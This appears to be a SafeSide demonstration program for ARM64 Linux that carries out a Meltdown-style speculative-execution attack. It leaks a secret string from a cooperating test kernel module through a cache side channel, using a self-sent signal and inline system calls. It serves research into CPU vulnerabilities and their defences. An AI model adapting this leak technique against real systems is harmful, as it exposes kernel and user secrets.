/*
 * Copyright 2019 Google LLC
 *
 * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
 * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
 *
 * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
 */

#include "compiler_specifics.h"

#if !SAFESIDE_LINUX
#  error Unsupported OS. Linux required.
#endif

#if !SAFESIDE_ARM64
#  error Unsupported architecture. ARM64 required.
#endif

#include <array>
#include <cstring>
#include <fstream>
#include <iostream>

#include <signal.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

#include "cache_sidechannel.h"
#include "instr.h"
#include "local_content.h"
#include "meltdown_local_content.h"
#include "utils.h"

static char LeakByte(const char *data, size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    // Load the secret data into cache so it is more likely to be available
    // to transient instructions.
    std::ifstream is("/sys/kernel/debug/safeside_meltdown/secret_data_in_cache");
    is.get();
    is.close();

    size_t safe_offset = run % strlen(public_data);
    sidechannel.FlushOracle();

    // Architecturally access the safe offset.
    ForceRead(oracle.data() + static_cast<size_t>(data[safe_offset]));

    // Sends a SIGUSR1 signal to itself. The signal handler shifts the control
    // flow to the "afterspeculation" label.
    // We don't want to use the "syscall" library function in order to avoid
    // Spectre v2 effects that the CPU jumps over that call, because we cannot
    // serialize that later.
    asm volatile(
        "mov x8, %0\n"
        "mov x0, %1\n"
        "mov x1, %2\n"
        "svc #0\n"::"r"(__NR_kill), "r"(getpid()), "r"(SIGUSR1));

    // Unreachable code. Speculatively access the unsafe offset.
    ForceRead(oracle.data() + static_cast<size_t>(data[offset]));

    std::cout << "Dead code. Must not be printed." << std::endl;

    // The exit call must not be unconditional, otherwise clang would optimize
    // out everything that follows it and the linking would fail.
    if (strlen(public_data) != 0) {
      exit(EXIT_FAILURE);
    }

    // SIGUSR1 signal handler moves the instruction pointer to this label.
    asm volatile("afterspeculation:");

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(data[safe_offset]);

    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  OnSignalMoveRipToAfterspeculation(SIGUSR1);

  size_t private_data, private_length;
  std::ifstream in("/sys/kernel/debug/safeside_meltdown/secret_data_address");
  if (in.fail()) {
    std::cerr << "Meltdown module not loaded or not running as root."
              << std::endl;
    exit(EXIT_FAILURE);
  }
  in >> std::hex >> private_data;
  in.close();
  
  std::cout << "Address of private_data in kernel module: " << std::hex << private_data << std::endl;

  in.open("/sys/kernel/debug/safeside_meltdown/secret_data_length");
  in >> std::dec >> private_length;
  in.close();

  std::cout << "Length of private_data in kernel module: " << std::hex << private_length << std::endl;

  std::cout << "Leaking the string: ";
  std::cout.flush();
  const size_t private_offset =
      reinterpret_cast<const char *>(private_data) - public_data;
  for (size_t i = 0; i < private_length; ++i) {
    std::cout << LeakByte(public_data, private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
